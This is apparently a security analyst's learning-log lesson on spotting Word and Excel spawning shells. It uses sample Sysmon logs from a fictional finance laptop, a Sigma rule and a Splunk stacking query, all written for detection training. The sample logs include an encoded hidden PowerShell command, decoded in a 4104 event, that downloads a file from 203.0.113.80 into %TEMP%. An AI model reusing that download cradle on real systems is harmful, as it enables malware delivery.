# Day 07 — Parent–Child Process Anomalies (Office Spawning Shells)

📅 17 October 2026 · 🏷️ Endpoint telemetry · ⏱️ ~25 min

---

## Why it matters

On Day 05 you followed a chain on `FS01`: `explorer.exe` → `cmd.exe` → each
discovery tool. That chain looked normal, because a person at a desktop really
does start a command prompt from Explorer. Today is the opposite case: a chain
where the **parent** is the giveaway. Word, Excel and Outlook are for reading
and writing documents. When one of them starts `cmd.exe` or `powershell.exe`,
the most common explanation is a malicious macro or a booby-trapped document
that a user opened from an email. It happens during business hours, as an
ordinary user, with no failed logons beforehand, so none of the signals from
Days 01 to 04 help. The process tree is often the **first** place it shows up.

---

## The concept

### Every process has a parent

When a program starts another program, the first is the **parent** and the
second is the **child**. Sysmon Event ID 1 records both: `Image` is the child,
`ParentImage` is the parent, and `ParentProcessGuid` links the child to the
parent's own Event ID 1. Follow those GUIDs upwards and you rebuild the whole
family tree.

Windows has a predictable family tree, and knowing a few "who starts whom"
facts lets you spot an impostor:

| Process | Expected parent | If you see anything else |
|---|---|---|
| `svchost.exe` | `services.exe` | Possibly a fake `svchost.exe` hiding in plain sight (T1036) |
| `lsass.exe` | `wininit.exe` | Very suspicious: `lsass.exe` holds credentials |
| `explorer.exe` | `userinit.exe` (which then exits) | Often shows a parent that **no longer exists**, which is normal here |
| `taskhostw.exe` | `svchost.exe` (Task Scheduler) | Worth a look |

### What Office normally starts

Office apps start very few child processes in normal use. A short,
realistic list:

| Parent | Normal child | Why |
|---|---|---|
| `OUTLOOK.EXE` | `WINWORD.EXE`, `EXCEL.EXE` | User double-clicks an attachment |
| `OUTLOOK.EXE` | `msedge.exe` (or another browser) | User clicks a link in an email |
| `WINWORD.EXE`, `EXCEL.EXE` | `splwow64.exe` | Printing (the 64-bit print driver host) |

And the children that should make you stop:

| Child | What it is |
|---|---|
| `cmd.exe`, `powershell.exe`, `pwsh.exe` | Command shells |
| `wscript.exe`, `cscript.exe` | Windows Script Host (runs `.vbs` / `.js`) |
| `mshta.exe` | Runs HTML Applications (`.hta`) |
| `rundll32.exe`, `regsvr32.exe` | Load and run code from a DLL |
| `certutil.exe`, `bitsadmin.exe` | Built-in tools often misused to download files |

> 💡 **The analyst's shortcut:** an Office app starting a **shell or script
> host** is rarely normal. Treat it as "a document ran code" until you've proved
> otherwise.

### Why it happens

A **macro** is a small program (VBA) saved inside a document. A macro-enabled
Word file ends in `.docm`, and Excel uses `.xlsm`. A macro can start any
program the user could start, so a malicious one typically launches a shell to
download the next stage. MITRE ATT&CK calls the user's part **T1204.002 User
Execution: Malicious File** and the delivery **T1566.001 Spearphishing
Attachment**.

Two defences are worth knowing by name:

- **Macros from the internet are blocked by default.** Microsoft 365 blocks
  VBA macros in files that carry the *Mark of the Web* (downloaded or received
  as an attachment). If a macro ran anyway, ask why: a policy exception, a
  trusted location, or a user removing the block.
- **Attack Surface Reduction (ASR)** in Microsoft Defender for Endpoint has a
  rule called *Block all Office applications from creating child processes*
  (GUID `d4f940ab-401b-4efc-aadc-ad5f3c50688a`). In **audit** mode it logs
  what it would have blocked, which is a ready-made list of every Office child
  process in your fleet.

### One limitation: Sysmon shows one level up

Sysmon Event ID 1 has `ParentImage` but **not** the grandparent. If Word starts
`cmd.exe`, and `cmd.exe` starts `powershell.exe`, the PowerShell event only
says "parent: `cmd.exe`". To see that Word is behind it, you follow
`ParentProcessGuid` back one more event. Keep that in mind when you write rules:
a rule on "Office parent → PowerShell child" misses `Word → cmd → PowerShell`.

---

## Sample logs

A new host today: `WS-FIN07`, the Windows 11 laptop of **Priya Nair** in
Northwind's finance team. Times are UTC (00:41 UTC on 15 October is **11:41 in
Sydney**: the middle of her working morning).

First, **one full Sysmon Event ID 1**, slightly trimmed:

```
Process Create:
UtcTime: 2026-10-15 00:41:19.306
ProcessGuid: {9a4e7b10-0f2f-670e-9c02-000000002b00}
ProcessId: 8532
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.22621.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /c powershell -NoP -W Hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA4ADAALwBpAG4AdgBvAGkAYwBlAC4AZABhAHQAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAGUAbgB2ADoAVABFAE0AUABcAGkAbgB2AG8AaQBjAGUALgBkAGEAdAA=
CurrentDirectory: C:\Users\priya.nair\Documents\
User: NORTHWIND\priya.nair
LogonId: 0x2C81F4
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA256=7C03E5…B2F9 (shortened)
ParentProcessGuid: {9a4e7b10-0f2b-670e-9502-000000002b00}
ParentProcessId: 8460
ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
ParentCommandLine: "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\priya.nair\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\7KQ2M9XB\Invoice_88214.docm" /o ""
```

Then **every Sysmon Event ID 1 in Priya's Outlook process tree** that morning.
All rows are `User: NORTHWIND\priya.nair`. Image names are shortened to the
file name, `…\Content.Outlook\` stands for the full Outlook attachment cache
path, and long Base64 strings are cut with `…`.

```
UtcTime (2026-10-15)  PID   PPID  ParentImage   Image           CommandLine
00:12:05              7720  3016  explorer.exe  OUTLOOK.EXE     "…\Office16\OUTLOOK.EXE"
00:31:44              7904  7720  OUTLOOK.EXE   msedge.exe      "…\msedge.exe" --single-argument https://intranet.northwind-example.com/news
00:38:51              8144  7720  OUTLOOK.EXE   EXCEL.EXE       "…\Office16\EXCEL.EXE" "…\Content.Outlook\AB12CD34\Budget_Q4.xlsx"
00:39:30              8212  8144  EXCEL.EXE     splwow64.exe    C:\WINDOWS\splwow64.exe 12288
00:41:02              8460  7720  OUTLOOK.EXE   WINWORD.EXE     "…\Office16\WINWORD.EXE" /n "…\Content.Outlook\7KQ2M9XB\Invoice_88214.docm" /o ""
00:41:19              8532  8460  WINWORD.EXE   cmd.exe         cmd.exe /c powershell -NoP -W Hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBS…
00:41:19              8540  8532  cmd.exe       powershell.exe  powershell -NoP -W Hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBS…
```

And the **Event ID 4104** that Script Block Logging (Day 06) wrote one second
later:

```
Event ID: 4104   Level: Verbose   Computer: WS-FIN07.northwind-example.com
TimeCreated (UTC): 2026-10-15 00:41:20
Creating Scriptblock text (1 of 1):
Invoke-WebRequest -Uri http://203.0.113.80/invoice.dat -OutFile $env:TEMP\invoice.dat

ScriptBlock ID: b81f6d02-4a3e-4c97-9e15-6f2a0c7d83e4
Path:
```

---

## What to look for

1. **The wrong parent.** At 00:41:19, `WINWORD.EXE` (PID 8460) started
   `cmd.exe`. That's the one row in the tree where an Office app starts a
   shell. The full event's `ParentCommandLine` tells you which document did
   it: `Invoice_88214.docm`, a **macro-enabled** Word file.
2. **Where the document came from.** Word was started by `OUTLOOK.EXE`
   (PID 7720), and the file sits in `INetCache\Content.Outlook\`, the folder
   Outlook uses for attachments opened straight from an email. So this was an
   email attachment, which is tomorrow's topic.
3. **Speed.** **17 seconds** passed between Word opening (00:41:02) and
   `cmd.exe` starting (00:41:19). A person reading an invoice doesn't need a
   command prompt 17 seconds in. A macro that runs on open does.
4. **Day 06, again.** `cmd.exe` exists only to start `powershell -NoP -W Hidden
   -enc`, the same hiding switches as on `FS01`. The Base64 starts with
   `SQBuAHYAbwBrAGUALQ`, so it begins with `Invoke-`, and the 4104 confirms it:
   a download from `203.0.113.80` into Priya's `%TEMP%` folder. That's
   **T1105 Ingress Tool Transfer**, from a different IP than Day 06's
   `203.0.113.45`.
5. **Medium integrity.** Unlike `FS01` on Day 05, this ran as an ordinary user
   (`IntegrityLevel: Medium`). The attacker has Priya's rights, not admin
   rights, for now.
6. **The normal rows.** Of the **7** processes in the tree, **5** have an
   Office parent (`OUTLOOK.EXE`, `EXCEL.EXE` or `WINWORD.EXE`). Outlook itself
   was started by Explorer, and `powershell.exe` by `cmd.exe`. Four of those
   five Office children are everyday: Outlook opening Edge for an intranet
   link, Outlook opening an `.xlsx` attachment in Excel, Excel calling
   `splwow64.exe` because Priya printed the budget, and Outlook opening the
   Word attachment. The only Office child that isn't normal is `cmd.exe`.

---

## Detection logic

**In plain English:** alert when an Office application (Word, Excel,
PowerPoint, Outlook, Access, Publisher or OneNote) starts a shell, a script
host, or one of the built-in tools attackers use to run or download code.
Match the child by name **or** by original file name, so renaming
`powershell.exe` doesn't help.

Like Day 06, this is a **single-event** rule: no count or time window.

**Sigma:**

```yaml
title: Office Application Spawning A Shell Or Script Host
id: 07a8652e-5e09-4177-bbae-073a560ef2fc
status: experimental
description: >
  Detects a Microsoft Office application starting a command shell, script
  host or a built-in binary commonly used to run or download code. This is
  typical of malicious macros in documents delivered by email.
references:
  - https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference
  - https://attack.mitre.org/techniques/T1204/002/
  - https://attack.mitre.org/techniques/T1566/001/
author: Jay (SOC learning log)
date: 2026-10-17
tags:
  - attack.execution
  - attack.t1204.002
  - attack.t1059.001
  - attack.t1059.003
  - attack.initial-access
  - attack.t1566.001
logsource:
  category: process_creation
  product: windows
detection:
  selection_parent:
    ParentImage|endswith:
      - '\WINWORD.EXE'
      - '\EXCEL.EXE'
      - '\POWERPNT.EXE'
      - '\OUTLOOK.EXE'
      - '\MSACCESS.EXE'
      - '\MSPUB.EXE'
      - '\ONENOTE.EXE'
  selection_child:
    - Image|endswith:
        - '\cmd.exe'
        - '\powershell.exe'
        - '\pwsh.exe'
        - '\wscript.exe'
        - '\cscript.exe'
        - '\mshta.exe'
        - '\rundll32.exe'
        - '\regsvr32.exe'
        - '\certutil.exe'
        - '\bitsadmin.exe'
    - OriginalFileName:
        - 'Cmd.Exe'
        - 'PowerShell.EXE'
        - 'pwsh.dll'
        - 'wscript.exe'
        - 'cscript.exe'
        - 'MSHTA.EXE'
        - 'RUNDLL32.EXE'
        - 'REGSVR32.EXE'
        - 'CertUtil.exe'
        - 'bitsadmin.exe'
  condition: all of selection_*
falsepositives:
  - Business macros or add-ins that legitimately run a command (reporting, document management)
  - Rare Office repair or update actions started from inside an Office app
level: high
```

How it works:

- `selection_parent` is one map with one list, so any of the seven Office
  names counts (a list of values means **OR**).
- `selection_child` is a **list of two maps**, the same trick as Day 06: the
  child matches by `Image` **or** by `OriginalFileName`. A copy of `cmd.exe`
  renamed to `notes.exe` still has `OriginalFileName: Cmd.Exe`.
- Sigma value matching is case-insensitive, so `WINWORD.EXE` matches
  `winword.exe` and `Cmd.Exe` matches `CMD.EXE`.
- `condition: all of selection_*` means **both**: Office parent **and**
  suspicious child.

On the sample, the rule matches **1** of the 7 events: `cmd.exe` at 00:41:19,
because its `ParentImage` ends in `\WINWORD.EXE`. It does **not** match
`powershell.exe` (its parent is `cmd.exe`, not Office). That's the
"one level up" limitation in action, and it's why `cmd.exe` is on the child
list. Edge, Excel, Word and `splwow64.exe` aren't on the child list, so their
rows don't match.

**Hunting by stacking.** Rules catch the pairs you already know are bad.
**Stacking** finds the ones you didn't think of: count every parent–child pair
across the fleet, then read the list from the **rarest** up. In Splunk:

```spl
source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| eval parent=lower(mvindex(split(ParentImage, "\\"), -1)),
       child=lower(mvindex(split(Image, "\\"), -1))
| search parent IN ("winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe")
| stats count dc(host) AS hosts BY parent child
| sort count
```

`split` breaks the path at each backslash (`"\\"` is one literal backslash in
SPL), and `mvindex(..., -1)` keeps the last piece, the file name. Run over
**30 days** of Northwind workstations, the output looks like this:

```
parent        child           count   hosts
winword.exe   cmd.exe             1       1
excel.exe     cmd.exe            22       1
excel.exe     splwow64.exe      388      97
winword.exe   splwow64.exe      512     120
outlook.exe   winword.exe      2961     209
outlook.exe   excel.exe        3377     214
outlook.exe   msedge.exe      12904     231
```

The top row is `WS-FIN07`. The second row is new to you: 22 times, on one
host, Excel started `cmd.exe`. The Sigma rule would have fired on those too.
Exercise 3 is about what to do with it.

**Tuning note:** a business macro that shells out (a month-end report, a
document-management add-in) will fire this rule every time it runs. Exclude it
**narrowly**: the exact host or group of hosts, the exact parent, **and** the
exact child `CommandLine`. Never exclude a whole parent such as `EXCEL.EXE`,
because that's exactly what an attacker's `.xlsm` would run under. Check
whether your Office build uses a different path (`Office16` is current
Microsoft 365, but older installs differ), which is why the rule uses
`endswith` on the file name rather than a full path. Finally, remember that
advanced attackers can fake a process's parent (**T1134.004 Parent PID
Spoofing**), so a clean-looking tree is not proof of innocence. Most commodity
macro malware doesn't bother, which is why this rule still earns its place.

---

## Your turn

1. Run **both** Day 06's encoded-PowerShell rule and today's Office-child rule
   over the `WS-FIN07` tree. Which event does each one fire on? Why does having
   both rules give you a better picture than either one alone?
2. You're looking only at the `powershell.exe` event (PID 8540). Using the
   fields in the logs, explain step by step how you'd prove that Word, and the
   file `Invoice_88214.docm`, are behind it.
3. The stacking output shows `excel.exe` → `cmd.exe` **22** times on **one**
   host. Write down **three** questions you'd answer before deciding it's a
   legitimate business macro. If it is, write a `filter_` block for today's
   Sigma rule that excludes it narrowly (invent sensible values for the host
   and command line), and update the `condition`.
4. Priya's Outlook started `WINWORD.EXE` at 00:41:02. That's a normal
   parent–child pair, but something in its `CommandLine` would still catch your
   eye. What is it, and what does it suggest about the email she received?

---

## My answers

<!-- Answer each question in your own words, then commit. -->

1.

2.

3.

4.

---

## Further reading

- Microsoft Learn: [Attack surface reduction rules reference](https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference) · [Macros from the internet are blocked by default in Office](https://learn.microsoft.com/en-us/microsoft-365-apps/security/internet-macros-blocked) · [Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
- SigmaHQ: [Windows process creation rules](https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation)
- MITRE ATT&CK: [T1566.001 Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/) · [T1204.002 Malicious File](https://attack.mitre.org/techniques/T1204/002/) · [T1059.003 Windows Command Shell](https://attack.mitre.org/techniques/T1059/003/) · [T1134.004 Parent PID Spoofing](https://attack.mitre.org/techniques/T1134/004/)

⬅️ [Learning log index](README.md) · ➡️ Day 08: Phishing triage: reading email headers (SPF, DKIM, DMARC) (18 Oct)
